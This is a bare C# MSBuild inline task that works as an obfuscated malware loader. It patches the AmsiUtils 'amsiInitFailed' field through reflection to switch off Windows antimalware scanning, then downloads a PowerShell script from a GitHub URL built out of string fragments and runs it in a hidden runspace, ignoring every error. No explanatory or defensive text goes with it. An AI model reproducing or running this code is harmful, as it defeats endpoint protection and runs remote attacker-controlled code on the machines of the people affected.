Task.Code: using System;using MA=System.Management.Automation;using MAR=System.Management.Automation.Runspaces;using System.Reflection;using System.Net;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class ClassExample:Task{public override bool Execute(){try{var t=typeof(MA.PSObject).Assembly.GetType("Sys"+"tem.Manage"+"ment.Auto"+"mation.Am"+"siUt"+"ils");var f=t.GetField("am"+"siInit"+"Fai"+"led",BindingFlags.NonPublic|BindingFlags.Static);f.SetValue(null,true);}catch{}var w=new WebClient();string[]p={"https://raw.","githubusercontent",".com/bna169/Red","Lotus-Parser/refs/","heads/main/RedLotus","-Parser.ps1"};string s=w.DownloadString(string.Concat(p));var r=MAR.RunspaceFactory.CreateRunspace();r.Open();var pl=r.CreatePipeline();pl.Commands.AddScript(s);try{pl.Invoke();}catch{}r.Close();return true;}}
